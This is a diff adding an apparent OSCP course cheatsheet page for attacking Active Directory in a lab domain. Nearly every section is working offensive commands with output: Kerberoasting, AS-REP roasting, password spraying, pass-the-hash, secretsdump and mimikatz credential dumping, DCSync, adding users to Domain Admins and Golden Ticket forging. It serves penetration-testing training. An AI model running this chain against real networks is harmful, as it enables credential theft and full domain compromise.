@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reference · Active Directory Cheatsheet</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+<nav class="crumbs">OSCP Course · <a href="./links.html">Links</a> · Reference · <strong>Active Directory</strong> · <a href="./glossary.html">Glossary</a> · <a href="./password-attacks.html">Password Attacks</a></nav>
+
+<span class="kicker">Reference · Foothold → Domain Admin</span>
+<h1>Active Directory Cheatsheet</h1>
+<p class="lead">Commands for <a href="../lessons/0010-active-directory-enumeration.html">Lesson 10</a> onward. AD is a loop, not a checklist: <strong>enumerate → attack tickets → move laterally → repeat until Domain Admin.</strong> The heavy lifting is done by four tools — <a href="https://github.com/fortra/impacket">Impacket</a>, <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a> (the maintained CrackMapExec), <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a>, and <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>. For anything not here, cross-reference <a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">S1ckB0y1337's AD cheat sheet</a> and look up the right tool/flag for a creds-and-target combo on <a href="https://wadcoms.github.io/">WADComs</a>. Lab domain: <code>corp.local</code>, DC <code>10.10.10.10</code>, user <code>bob</code>, attacker <code>10.10.14.5</code>.</p>
+
+<h2>1 · Enumerate with creds</h2>
+<pre><span class="c"># NetExec (nxc) — one pass for users, groups, shares, policy, sessions</span>
+<span class="p">$</span> <span class="o">nxc smb 10.10.10.10 -u bob -p 'Pass' --users --groups --shares --pass-pol --loggedon-users</span>
+<span class="o">SMB  10.10.10.10  445  DC01  [+] corp.local\bob:Pass</span>
+<span class="o">SMB  10.10.10.10  445  DC01  [*] Enumerated 42 domain users</span>
+<span class="o">SMB  10.10.10.10  445  DC01  </span><span class="h">SYSVOL  READ  Logon scripts</span>
+
+<span class="c"># rpcclient — interactive RID/group walk over MS-RPC</span>
+<span class="p">$</span> <span class="o">rpcclient -U bob 10.10.10.10</span>
+<span class="p">rpcclient $&gt;</span> <span class="o">enumdomusers</span>          <span class="c"># every user + RID</span>
+<span class="p">rpcclient $&gt;</span> <span class="o">querygroupmem 0x200</span>     <span class="c"># members of a group (e.g. Domain Admins)</span>
+<span class="p">rpcclient $&gt;</span> <span class="o">queryuser 0x44c</span>          <span class="c"># detail on one RID</span>
+
+<span class="c"># enum4linux-ng — wraps the above; great first sweep</span>
+<span class="p">$</span> <span class="o">enum4linux-ng -A 10.10.10.10</span>
+
+<span class="c"># LDAP — the source of truth; dump the whole naming context</span>
+<span class="p">$</span> <span class="o">ldapsearch -x -H ldap://10.10.10.10 -D 'bob@corp.local' -w Pass -b "DC=corp,DC=local"</span>
+
+<span class="c"># Impacket — list all users with attributes (lastLogon, pwdLastSet)</span>
+<span class="p">$</span> <span class="o">GetADUsers.py -all corp.local/bob:Pass -dc-ip 10.10.10.10</span></pre>
+<p class="cite">Any valid domain credential unlocks all of the above. Capture <code>--users</code> to a <code>users.txt</code> — you reuse it for spraying and roasting.</p>
+
+<h2>2 · Pre-auth — no creds yet</h2>
+<pre><span class="c"># Validate usernames against Kerberos with NO password (no logs, no lockout)</span>
+<span class="p">$</span> <span class="o">kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt</span>
+<span class="o">[+] VALID USERNAME:  </span><span class="h">bob@corp.local</span>
+<span class="o">[+] VALID USERNAME:  </span><span class="h">svc-sql@corp.local</span>
+
+<span class="c"># Null / anonymous SMB session — sometimes leaks users, shares, pass policy</span>
+<span class="p">$</span> <span class="o">nxc smb 10.10.10.10 -u '' -p ''</span>
+<span class="p">$</span> <span class="o">nxc smb 10.10.10.10 -u 'guest' -p '' --users</span></pre>
+<p class="cite">Build <code>users.txt</code> from kerbrute hits, then move straight to AS-REP roasting (§4) and spraying (§6) — both work with a username list alone.</p>
+
+<h2>3 · BloodHound — map the attack paths</h2>
+<pre><span class="c"># Collect from Linux with creds (no agent on the box needed)</span>
+<span class="p">$</span> <span class="o">bloodhound-python -c all -u bob -p Pass -d corp.local -ns 10.10.10.10</span>
+<span class="c"># …or from a Windows foothold:</span>
+<span class="p">PS&gt;</span> <span class="o">.\SharpHound.exe -c All</span>          <span class="c"># drops a timestamped .zip of .json</span>
+
+<span class="c"># Start the DB + UI, then drag-drop the .json/.zip into the browser</span>
+<span class="p">$</span> <span class="o">sudo neo4j start &amp;&amp; bloodhound</span></pre>
+<p class="cite">After import, run these pre-built queries: <strong>Shortest Path to Domain Admins</strong>, <strong>Kerberoastable Users</strong>, <strong>AS-REP Roastable Users</strong>, and <strong>Find Principals with DCSync Rights</strong>. Mark every owned node "Owned" so paths re-route through your foothold.</p>
+
+<h2>4 · AS-REP roasting (no pre-auth required)</h2>
+<pre><span class="c"># Users with "Do not require Kerberos preauth" → grab a crackable AS-REP</span>
+<span class="p">$</span> <span class="o">impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10</span>
+<span class="o">$krb5asrep$23$</span><span class="h">svc-sql@CORP.LOCAL</span><span class="o">:a1b2…&lt;hash&gt;…</span>
+
+<span class="c"># With creds you can target the whole domain at once:</span>
+<span class="p">$</span> <span class="o">impacket-GetNPUsers corp.local/bob:Pass -dc-ip 10.10.10.10 -request</span>
+
+<span class="c"># Crack it (mode 18200 = AS-REP)</span>
+<span class="p">$</span> <span class="o">hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r best64.rule</span></pre>
+
+<h2>5 · Kerberoasting (needs any valid creds)</h2>
+<pre><span class="c"># Request TGS tickets for every account with an SPN (usually service accounts)</span>
+<span class="p">$</span> <span class="o">impacket-GetUserSPNs corp.local/bob:Pass -dc-ip 10.10.10.10 -request</span>
+<span class="o">ServicePrincipalName    Name      MemberOf</span>
+<span class="o">MSSQLSvc/sql01:1433     </span><span class="h">svc-sql</span><span class="o">   Domain Admins</span>
+<span class="o">$krb5tgs$23$*svc-sql$CORP.LOCAL$…&lt;hash&gt;…</span>
+
+<span class="c"># Crack it (mode 13100 = TGS-REP / RC4)</span>
+<span class="p">$</span> <span class="o">hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt -r best64.rule</span></pre>
+<p class="cite">A Kerberoastable account in Domain Admins is the classic shortcut to the whole forest. Check BloodHound's group memberships before you burn hours cracking.</p>
+
+<h2>6 · Password spraying</h2>
+<pre><span class="c"># One password, many users — beats brute force on lockout policy</span>
+<span class="p">$</span> <span class="o">nxc smb 10.10.10.10 -u users.txt -p 'Season2025!' --continue-on-success</span>
+<span class="o">SMB  10.10.10.10  445  DC01  </span><span class="h">[+] corp.local\jdoe:Season2025!</span>
+
+<span class="c"># Also spray reused/cracked creds across every host to find more access</span>
+<span class="p">$</span> <span class="o">nxc smb 10.10.10.0/24 -u jdoe -p 'Season2025!' --continue-on-success</span></pre>
+<div class="box warn">
+<span class="box-title">Check lockout before you spray</span>
+Read <code>--pass-pol</code> first. If <code>lockoutThreshold</code> is 5, attempt <strong>≤ 3 passwords per <code>lockoutObservationWindow</code></strong> and wait it out. Locking real users is noisy, costs you the box, and in a real engagement is a serious incident.
+</div>
+
+<h2>7 · Lateral movement &amp; remote exec</h2>
+<pre><span class="c"># Impacket exec methods (need local-admin creds on the target)</span>
+<span class="p">$</span> <span class="o">impacket-psexec corp.local/admin:Pass@10.10.10.20</span>   <span class="c"># SYSTEM, drops a service (noisy)</span>
+<span class="p">$</span> <span class="o">impacket-wmiexec corp.local/admin:Pass@10.10.10.20</span>  <span class="c"># semi-interactive, stealthier</span>
+<span class="p">$</span> <span class="o">impacket-smbexec corp.local/admin:Pass@10.10.10.20</span>  <span class="c"># no binary dropped to disk</span>
+
+<span class="c"># WinRM (port 5985) — needs membership of "Remote Management Users"</span>
+<span class="p">$</span> <span class="o">evil-winrm -i 10.10.10.20 -u admin -p Pass</span>
+
+<span class="c"># RDP — full GUI session (port 3389)</span>
+<span class="p">$</span> <span class="o">xfreerdp /v:10.10.10.20 /u:admin /p:Pass /cert:ignore +clipboard</span></pre>
+<p class="cite">Check exec rights fast: <code>nxc smb 10.10.10.0/24 -u admin -p Pass</code> — a <code>(Pwn3d!)</code> tag means psexec/wmiexec will land.</p>
+
+<h2>8 · Pass-the-Hash (no plaintext needed)</h2>
+<pre><span class="c"># An NTLM hash authenticates just like a password over SMB/WinRM</span>
+<span class="p">$</span> <span class="o">nxc smb 10.10.10.20 -u admin -H &lt;NTLM&gt;</span>
+<span class="p">$</span> <span class="o">evil-winrm -i 10.10.10.20 -u admin -H &lt;NTLM&gt;</span>
+<span class="p">$</span> <span class="o">impacket-psexec -hashes :&lt;NTLM&gt; corp.local/admin@10.10.10.20</span></pre>
+<p class="cite">Hash format is <code>LM:NTLM</code>; pass-the-hash only needs the NTLM half, so the leading colon (empty LM) is fine. Spray a recovered hash across the subnet to find every box it pops.</p>
+
+<h2>9 · Credential harvesting</h2>
+<pre><span class="c"># secretsdump — local SAM, LSA secrets, and cached domain logons from a host</span>
+<span class="p">$</span> <span class="o">impacket-secretsdump corp.local/admin:Pass@10.10.10.20</span>
+<span class="o">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span>
+<span class="o">Administrator:500:aad3b…:</span><span class="h">31d6cfe0d16ae931b73c59d7e0c089c0</span>
+
+<span class="c"># On a Windows foothold, mimikatz pulls live creds from LSASS</span>
+<span class="p">mimikatz #</span> <span class="o">privilege::debug</span>
+<span class="p">mimikatz #</span> <span class="o">sekurlsa::logonpasswords</span>   <span class="c"># NTLM + sometimes cleartext of logged-on users</span>
+<span class="p">mimikatz #</span> <span class="o">lsadump::sam</span>              <span class="c"># local SAM hashes</span></pre>
+<p class="cite">Every hash and password feeds back into §6–§8. The local Administrator hash is often reused across the whole fleet — spray it first.</p>
+
+<h2>10 · Become Domain Admin</h2>
+<pre><span class="c"># DCSync — replicate secrets from the DC (needs DS-Replication rights / DA)</span>
+<span class="p">$</span> <span class="o">impacket-secretsdump -just-dc corp.local/admin:Pass@10.10.10.10</span>
+<span class="o">krbtgt:502:aad3b…:</span><span class="h">&lt;krbtgt NTLM&gt;</span>
+<span class="o">Administrator:500:aad3b…:</span><span class="h">&lt;Administrator NTLM&gt;</span>
+
+<span class="c"># ACL abuse — BloodHound shows GenericAll / WriteDACL / GenericWrite edges</span>
+<span class="p">$</span> <span class="o">bloodyAD --host 10.10.10.10 -d corp.local -u bob -p Pass set password targetuser 'New!Pass1'</span>
+<span class="p">$</span> <span class="o">dacledit.py -action write -rights DCSync -principal bob -target-dn 'DC=corp,DC=local' corp.local/bob:Pass</span>
+<span class="p">$</span> <span class="o">net rpc group addmem "Domain Admins" bob -U corp.local/bob%Pass -S 10.10.10.10</span>
+
+<span class="c"># Golden Ticket — forge a TGT with the krbtgt hash (persistence; out of scope to rely on)</span>
+<span class="p">$</span> <span class="o">impacket-ticketer -nthash &lt;krbtgt NTLM&gt; -domain-sid &lt;SID&gt; -domain corp.local Administrator</span></pre>
+<p class="cite">DCSyncing <code>krbtgt</code> + Administrator is game over for the domain. Golden Tickets are a persistence trick — note them, but the exam path is the access you just earned.</p>
+
+<h2>11 · GPP passwords in SYSVOL</h2>
+<pre><span class="c"># Group Policy Preferences stored an AES key Microsoft published — trivially reversible</span>
+<span class="p">$</span> <span class="o">nxc smb 10.10.10.10 -u bob -p Pass -M gpp_password</span>
+<span class="c"># …or grep SYSVOL by hand for the cpassword attribute</span>
+<span class="p">$</span> <span class="o">find /mnt/sysvol -name '*.xml' | xargs grep -i cpassword</span>
+<span class="o">&lt;Properties userName="svc-backup" cpassword="</span><span class="h">edBSHO…&lt;blob&gt;…</span><span class="o">"/&gt;</span>
+
+<span class="c"># Decrypt it instantly</span>
+<span class="p">$</span> <span class="o">gpp-decrypt 'edBSHO…&lt;blob&gt;…'</span>
+<span class="h">Summer2024!</span></pre>
+
+<div class="box warn">
+<span class="box-title">Grab proof + document the chain</span>
+Collect <code>proof.txt</code> from <strong>every</strong> host you own (and each <code>local.txt</code> where present), and write down the exact path — foothold user → roasted/sprayed creds → lateral host → DCSync. AD is scored as a set: <strong>partial points depend on a clear, reproducible chain from foothold to DC</strong>, not just the final flag.
+</div>
+
+<footer>
+<span><a href="../lessons/0010-active-directory-enumeration.html">← Lesson 10: Active Directory Enumeration</a></span>
+<span><a href="./glossary.html">Glossary</a> · <a href="./password-attacks.html">Password Attacks</a></span>
+</footer>
+
+</body>
+</html>
